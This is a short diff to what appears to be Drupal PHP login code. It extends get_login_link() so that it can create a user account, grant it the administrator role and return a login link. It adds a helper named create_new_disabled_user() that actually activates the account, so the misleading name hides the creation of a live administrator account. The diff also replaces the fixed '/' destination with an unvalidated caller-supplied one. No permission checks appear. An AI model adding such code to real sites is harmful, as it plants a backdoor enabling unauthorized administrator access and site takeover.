@@ -35,9 +35,21 @@ function check_password_hash($password, $hash): bool {
     return \Drupal::service('password')->check($password, $hash);
 }
 
-function get_login_link($name): string {
+function get_login_link($name, $destination = "", $update_user = FALSE, $grant_admin = FALSE): string {
     $account = user_load_by_name($name);
-    if (!$account) return "";
+    if (!$account) {
+        if (!$update_user) return "";
+        $account = create_new_disabled_user($name);
+    }
+
+    if ($update_user && $grant_admin) {
+        $account->addRole('administrator');
+    }
+
+    if ($update_user) {
+        $account->save();
+    }
+
     
     $timestamp = \Drupal::time()->getRequestTime();
     return Url::fromRoute(
@@ -49,8 +61,17 @@ function get_login_link($name): string {
         ],
         [
             'absolute' => false,
-            'query' => ['destination' => '/'],
+            'query' => ['destination' => $destination],
             'language' => \Drupal::languageManager()->getLanguage($account->getPreferredLangcode()),
         ]
     )->toString();
+}
+
+function create_new_disabled_user($name) {
+    $account = User::create([
+        'name' => $name,
+    ]);
+    $account->activate();
+    $account->save();
+    return $account;
 }
